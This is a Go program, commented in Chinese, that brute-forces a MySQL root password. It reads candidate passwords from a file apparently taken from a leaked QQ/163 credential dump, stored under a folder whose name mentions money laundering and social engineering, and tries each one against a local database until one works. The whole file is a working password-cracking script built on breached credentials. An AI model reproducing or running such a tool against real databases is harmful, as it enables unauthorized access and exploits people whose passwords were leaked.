package main

import "database/sql"
import "fmt"
import (
	"bufio"
	_ "github.com/go-sql-driver/mysql"
	"io"
	"os"
	"strings"
) //内置

//循环文件（密码字典）每一行，截取密码
//测试密码是否正确

func checkpassoword(password string) bool {
	db, err := sql.Open("mysql",
		"root:"+password+"@tcp(127.0.0.1:3306)/mydata?charset=utf8")
	//fmt.Println("数据库连接",db,err)
	_, err = db.Prepare("select * from  meimei") //密码正确可以执行，错误无法执行
	//fmt.Println("权限",stmt,err)
	if err != nil {
		return false
	} else {
		return true
	}

}

func RunallData() {
	path := "Z:\\J\\洗币\\社会工程学\\NBdata\\qqAnd163Password.txt" //密码地址
	passfile, err := os.Open(path)                           //打开文件
	if err != nil {
		fmt.Println("密码文件打开失败")
		return
	}
	br := bufio.NewReader(passfile) //读取文件对象
	for {
		line, _, end := br.ReadLine() //每次读取一行
		if end == io.EOF {
			break //文件结束跳出死循环
		}
		linestr := string(line) //读取每一行
		lines := strings.Split(linestr, " # ")
		if len(lines) == 2 {
			password := lines[0]

			if checkpassoword(password) {
				fmt.Println(password, "成功")
				break
			} else {
				fmt.Println(password, "失败")
			}
		}

	}

}

//穷举法（暴力法）破解密码
func main() {
	RunallData()
}
